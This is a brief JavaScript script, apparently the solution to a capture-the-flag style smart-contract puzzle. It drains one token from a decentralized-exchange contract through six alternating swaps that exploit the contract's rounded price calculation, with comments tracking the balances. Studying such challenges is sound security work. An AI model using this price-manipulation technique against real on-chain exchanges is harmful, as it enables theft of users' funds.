```js
const token1 = await contract.token1();
const token2 = await contract.token2();
const msgSender = web3.currentProvider.selectedAddress;
const contractAddress = contract.address;

// swap token1 -> token2
// token1: 10    100
// token2: 10    100
await contract.swap(token1, token2, 10);

// swap token2 -> token1
// token1: 0     110
// token2: 20    90
await contract.swap(token2, token1, 20);

// swap token1 -> token2
// token1: 24    86
// token2: 0     110
await contract.swap(token1, token2, 24);

// swap token2 -> token1
// token1: 0     110
// token2: 30    80
await contract.swap(token2, token1, 30);

// swap token1 -> token2
// token1: 41    69
// token2: 0     110
await contract.swap(token1, token2, 41);

// swap token2 -> token1
// token1: 0     110
// token2: 65    45
await contract.swap(token2, token1, 45);

// token1: 110   0
// token2: 20    90
```
